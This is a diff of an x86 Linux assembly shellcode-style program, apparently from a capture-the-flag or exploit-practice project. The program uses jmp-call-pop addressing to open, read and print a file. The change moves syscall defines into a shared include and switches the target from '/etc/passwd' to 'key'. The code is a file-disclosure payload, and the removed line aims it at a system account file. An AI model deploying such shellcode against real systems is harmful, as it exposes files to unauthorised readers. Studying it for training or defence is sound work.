@@ -2,11 +2,7 @@ section .text
 
 global _start
 
-%define SYS_OPEN 5
-%define SYS_EXIT 1
-%define SYS_READ 3
-%define SYS_WRITE 4	
-	
+        %include "../../../utils_linux_x86.asm"
 _start:
 	jmp FILENAME
 RET:
@@ -35,14 +31,14 @@ RET:
 	inc ebx
 	mov ecx, esp
 	int 0x80
-	
+
 	test edx, edx
 	jne short .LOOP
 
 	xor eax, eax
 	inc eax
 	int 0x80
-	
+
 FILENAME:
-call RET	
-string:	 db '/etc/passwd', 0x0
+call RET
+string:	 db 'key', 0x0
